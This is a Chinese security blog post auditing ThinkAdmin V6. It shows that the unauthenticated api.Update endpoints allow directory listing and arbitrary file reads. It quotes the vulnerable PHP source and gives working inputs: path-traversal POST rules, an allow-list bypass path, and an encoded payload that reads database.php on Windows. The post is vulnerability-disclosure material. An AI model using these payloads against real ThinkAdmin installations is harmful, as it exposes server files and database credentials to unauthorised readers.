@@ -1,0 +1,169 @@
+<!doctype html><html lang=zh-cn><meta charset=utf-8><meta name=generator content="Hugo 0.64.0"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><meta name=keywords content="PHP,代码审计,CVE"><meta name=description content="项目地址： https://github.com/zoujingli/ThinkAdmin/ app/admin/controller/api/Update.php存在3个function，都是不用登录认证就可以使用的，引"><title>ThinkAdmin V6 列目录/任意文件读取&nbsp;&ndash;&nbsp;WTFSec</title><link rel=stylesheet href=//cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.2/build/styles/github-gist.min.css><link rel=stylesheet href=/css/core.min.58bc4672a8045a0810ba4ad30a08c6d5589db1109ca0aa2e07c5e5438201ea8d11642ffa31d8ee7665d6a1b66ab9a3c5.css integrity=sha384-WLxGcqgEWggQukrTCgjG1VidsRCcoKouB8XlQ4IB6o0RZC/6MdjudmXWobZquaPF><meta name=twitter:card content="summary"><meta name=twitter:title content="ThinkAdmin V6 列目录/任意文件读取"><body><section id=header><div class="header wrap"><span class="header left-side"><a class="site home" href=/><span class="site name">WTFSec</span></a></span>
+<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>分类</a><a class="nav item" href=/tags/>标签</a><a class="nav item" href=/link/>友链</a>
+<input placeholder="Google 站内搜索" id=search_input style=width:150px>
+<button onclick=search()><svg width="13" height="13" viewBox="0 0 13 13"><path d="m4.8495 7.8226c.82666.0 1.5262-.29146 2.0985-.87438.57232-.58292.86378-1.2877.87438-2.1144.010599-.82666-.28086-1.5262-.87438-2.0985-.59352-.57232-1.293-.86378-2.0985-.87438-.8055-.010599-1.5103.28086-2.1144.87438-.60414.59352-.8956 1.293-.87438 2.0985.021197.8055.31266 1.5103.87438 2.1144.56172.60414 1.2665.8956 2.1144.87438zm4.4695.2115 3.681 3.6819-1.259 1.284-3.6817-3.7.0019784-.69479-.090043-.098846c-.87973.76087-1.92 1.1413-3.1207 1.1413-1.3553.0-2.5025-.46363-3.4417-1.3909s-1.4088-2.0686-1.4088-3.4239.4696-2.4966 1.4088-3.4239c.9392-.92727 2.0864-1.3969 3.4417-1.4088 1.3553-.011889 2.4906.45771 3.406 1.4088.9154.95107 1.379 2.0924 1.3909 3.4239.0 1.2126-.38043 2.2588-1.1413 3.1385l.098834.090049z"/></svg></button></nav></div><script>function search(){const search_value=document.getElementById("search_input").value;if(search_value!==''){window.open("/search/?q="+search_value,"_blank");}}
+document.getElementById("search_input").addEventListener("keydown",function(e){if(e.key==="Enter"){search()}});</script></span></div></section><section id=content><div class=article-container><section class="article header"><h1 class="article title">ThinkAdmin V6 列目录/任意文件读取</h1><p class="article date"><span class=lang><a>Hzllaga</a> </span>Thursday, August 27, 2020</p></section><article class="article markdown-body"><p>项目地址： <a href=https://github.com/zoujingli/ThinkAdmin/ target=_blank>https://github.com/zoujingli/ThinkAdmin/</a></p><p><code>app/admin/controller/api/Update.php</code>存在3个function，都是不用登录认证就可以使用的，引用列表如下：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>namespace app\admin\controller\api;
+
+use think\admin\Controller;
+use think\admin\service\InstallService;
+use think\admin\service\ModuleService;
+</code></pre></div><p><code>version()</code>可以获取到当前版本：<code>2020.08.03.01</code>，≤这个版本的都有可能存在漏洞</p><p>URL：<a href="http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version" target=_blank>http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version</a></p><h2 id=列目录>列目录</h2><p><code>node()</code>：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+* 读取文件列表
+*/
+public function node()
+{
+    $this-&gt;success(&#39;获取文件列表成功！&#39;, InstallService::instance()-&gt;getList(
+        json_decode($this-&gt;request-&gt;post(&#39;rules&#39;, &#39;[]&#39;, &#39;&#39;), true),
+        json_decode($this-&gt;request-&gt;post(&#39;ignore&#39;, &#39;[]&#39;, &#39;&#39;), true)
+    ));
+}
+</code></pre></div><p>直接把POST的<code>rules</code>和<code>ignore</code>参数传给<code>InstallService::instance()->getList()</code>，根据上面的use引用可以知道文件路径在<code>vendor/zoujingli/think-library/src/service/InstallService.php</code>：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 获取文件信息列表
+ * @param array $rules 文件规则
+ * @param array $ignore 忽略规则
+ * @param array $data 扫描结果列表
+ * @return array
+ */
+public function getList(array $rules, array $ignore = [], array $data = []): array
+{
+    // 扫描规则文件
+    foreach ($rules as $key =&gt; $rule) {
+        $name = strtr(trim($rule, &#39;\\/&#39;), &#39;\\&#39;, &#39;/&#39;);
+        $data = array_merge($data, $this-&gt;_scanList($this-&gt;root . $name));
+    }
+    // 清除忽略文件
+    foreach ($data as $key =&gt; $item) foreach ($ignore as $ign) {
+        if (stripos($item[&#39;name&#39;], $ign) === 0) unset($data[$key]);
+    }
+    // 返回文件数据
+    return [&#39;rules&#39; =&gt; $rules, &#39;ignore&#39; =&gt; $ignore, &#39;list&#39; =&gt; $data];
+}
+</code></pre></div><p><code>$ignore</code>可以不用关注，他会透过<code>_scanList()</code>去遍历<code>$rules</code>数组，调用<code>scanDirectory()</code>去递归遍历目录下的文件，最后在透过<code>_getInfo()</code>去获取文件名与哈希，由下面代码可以知道程序没有任何验证，攻击者可以在未授权的情况下读取服务器的文件列表。</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 获取目录文件列表
+ * @param string $path 待扫描目录
+ * @param array $data 扫描结果
+ * @return array
+ */
+private function _scanList($path, $data = []): array
+{
+    foreach (NodeService::instance()-&gt;scanDirectory($path, [], null) as $file) {
+        $data[] = $this-&gt;_getInfo(strtr($file, &#39;\\&#39;, &#39;/&#39;));
+    }
+    return $data;
+}
+</code></pre></div><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 获取所有PHP文件列表
+ * @param string $path 扫描目录
+ * @param array $data 额外数据
+ * @param string $ext 文件后缀
+ * @return array
+ */
+public function scanDirectory($path, $data = [], $ext = &#39;php&#39;)
+{
+    if (file_exists($path)) if (is_file($path)) $data[] = $path;
+    elseif (is_dir($path)) foreach (scandir($path) as $item) if ($item[0] !== &#39;.&#39;) {
+        $realpath = rtrim($path, &#39;\\/&#39;) . DIRECTORY_SEPARATOR . $item;
+        if (is_readable($realpath)) if (is_dir($realpath)) {
+            $data = $this-&gt;scanDirectory($realpath, $data, $ext);
+        } elseif (is_file($realpath) <span class=err>&amp;</span><span class=err>&amp;</span> (is_null($ext) || pathinfo($realpath, 4) === $ext)) {
+            $data[] = strtr($realpath, &#39;\\&#39;, &#39;/&#39;);
+        }
+    }
+    return $data;
+}
+</code></pre></div><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 获取指定文件信息
+ * @param string $path 文件路径
+ * @return array
+ */
+private function _getInfo($path): array
+{
+    return [
+        &#39;name&#39; =&gt; str_replace($this-&gt;root, &#39;&#39;, $path),
+        &#39;hash&#39; =&gt; md5(preg_replace(&#39;/\s+/&#39;, &#39;&#39;, file_get_contents($path))),
+    ];
+}
+</code></pre></div><p>读取网站根目录Payload: <a href="http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node" target=_blank>http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node</a></p><p>POST:</p><pre><code>rules=[&quot;/&quot;]
+</code></pre><p>也可以使用<code>../</code>来进行目录穿越</p><pre><code>rules=[&quot;../../../&quot;]
+</code></pre><p>演示站：</p><p><img src=https://cdn.wtfsec.org/img/20200827165022.png alt></p><h2 id=任意文件读取>任意文件读取</h2><p><code>get()</code>：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 读取文件内容
+ */
+public function get()
+{
+    $filename = decode(input(&#39;encode&#39;, &#39;0&#39;));
+    if (!ModuleService::instance()-&gt;checkAllowDownload($filename)) {
+        $this-&gt;error(&#39;下载的文件不在认证规则中！&#39;);
+    }
+    if (file_exists($realname = $this-&gt;app-&gt;getRootPath() . $filename)) {
+        $this-&gt;success(&#39;读取文件内容成功！&#39;, [
+            &#39;content&#39; =&gt; base64_encode(file_get_contents($realname)),
+        ]);
+    } else {
+        $this-&gt;error(&#39;读取文件内容失败！&#39;);
+    }
+}
+</code></pre></div><p>首先从GET读取<code>encode</code>参数并使用<code>decode()</code>解码：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 解密 UTF8 字符串
+ * @param string $content
+ * @return string
+ */
+function decode($content)
+{
+    $chars = &#39;&#39;;
+    foreach (str_split($content, 2) as $char) {
+        $chars .= chr(intval(base_convert($char, 36, 10)));
+    }
+    return iconv(&#39;GBK//TRANSLIT&#39;, &#39;UTF-8&#39;, $chars);
+}
+</code></pre></div><p>解密UTF8字符串的，刚好上面有个加密UTF8字符串的<code>encode()</code>，攻击时直接调用那个就可以了：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 加密 UTF8 字符串
+ * @param string $content
+ * @return string
+ */
+function encode($content)
+{
+    [$chars, $length] = [&#39;&#39;, strlen($string = iconv(&#39;UTF-8&#39;, &#39;GBK//TRANSLIT&#39;, $content))];
+    for ($i = 0; $i <span class=err>&lt;</span> $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
+    return $chars;
+}
+</code></pre></div><p>跟进<code>ModuleService::instance()->checkAllowDownload()</code>，文件路径<code>vendor/zoujingli/think-library/src/service/ModuleService.php</code>：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 检查文件是否可下载
+ * @param string $name 文件名称
+ * @return boolean
+ */
+public function checkAllowDownload($name): bool
+{
+    // 禁止下载数据库配置文件
+    if (stripos($name, &#39;database.php&#39;) !== false) {
+        return false;
+    }
+    // 检查允许下载的文件规则
+    foreach ($this-&gt;getAllowDownloadRule() as $rule) {
+        if (stripos($name, $rule) !== false) return true;
+    }
+    // 不在允许下载的文件规则
+    return false;
+}
+</code></pre></div><p>首先<code>$name</code>不能够是<code>database.php</code>，接着跟进<code>getAllowDownloadRule()</code>：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>/**
+ * 获取允许下载的规则
+ * @return array
+ */
+public function getAllowDownloadRule(): array
+{
+    $data = $this-&gt;app-&gt;cache-&gt;get(&#39;moduleAllowRule&#39;, []);
+    if (is_array($data) <span class=err>&amp;</span><span class=err>&amp;</span> count($data) &gt; 0) return $data;
+    $data = [&#39;config&#39;, &#39;public/static&#39;, &#39;public/router.php&#39;, &#39;public/index.php&#39;];
+    foreach (array_keys($this-&gt;getModules()) as $name) $data[] = &#34;app/{$name}&#34;;
+    $this-&gt;app-&gt;cache-&gt;set(&#39;moduleAllowRule&#39;, $data, 30);
+    return $data;
+}
+</code></pre></div><p>有一个允许的列表：</p><pre><code>config
+public/static
+public/router.php
+public/index.php
+app/admin
+app/wechat
+</code></pre><p>也就是说<code>$name</code>必须要不是<code>database.php</code>且要在允许列表内的文件才能够被读取，先绕过安全列表的限制，比如读取根目录的1.txt，只需要传入：</p><pre><code>public/static/../../1.txt
+</code></pre><p>而<code>database.php</code>的限制在Linux下应该是没办法绕过的，但是在Windows下可以透过<code>"</code>来替换<code>.</code>，也就是传入：</p><pre><code>public/static/../../config/database&quot;php
+</code></pre><p>对应encode()后的结果为：</p><div class=highlight><pre class=chroma><code class=language-php data-lang=php>34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34
+</code></pre></div><p>虽然数据库配置文件只能在Windows读取，但是不读取的情况下对于信息搜集也能起到很大的作用了。</p><p>Windows读取<code>database.php</code>：</p><p><img src=https://cdn.wtfsec.org/img/20200827165306.png alt></p><p>演示站读取<code>/etc/passwd</code>：</p><p><img src=https://cdn.wtfsec.org/img/20200827165154.png alt></p><p>V5连允许列表都没有，可以直接读任意文件。</p></article><section class="article labels"><a class=category href=/categories/%E5%8E%9F%E5%88%9B/>原创</a><a class=tag href=/tags/php/>PHP</a><a class=tag href=/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/>代码审计</a><a class=tag href=/tags/cve/>CVE</a></section></div><div class="article bottom"><section class="article navigation"><p><a class=link href=/posts/%E5%AE%A1%E8%AE%A1%E6%9F%90bc%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/><span class=li>&larr;</span>审计某bc系统实现代码执行</a></p></section></div></section><section id=footer><div class=footer-wrap><p class=copyright>©2014-2020 WTFSec.</p><p class=powerby><span>Powered by </span><a href=https://gohugo.io target=_blank>Hugo</a><span> and the </span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p><p class=powerby><span>CDN by </span><a href=https://cf.wtfsec.org target=_blank>Cloudflare</a><span> and </span><a href="https://console.upyun.com/register/?invite=H1xhvqTVV" target=_blank>又拍云</a></p></div></section><script src=//cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.2/build/highlight.min.js></script><script>hljs.initHighlightingOnLoad();</script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-83215806-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script data-ad-client=ca-pub-4220670081232153 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></body></html>
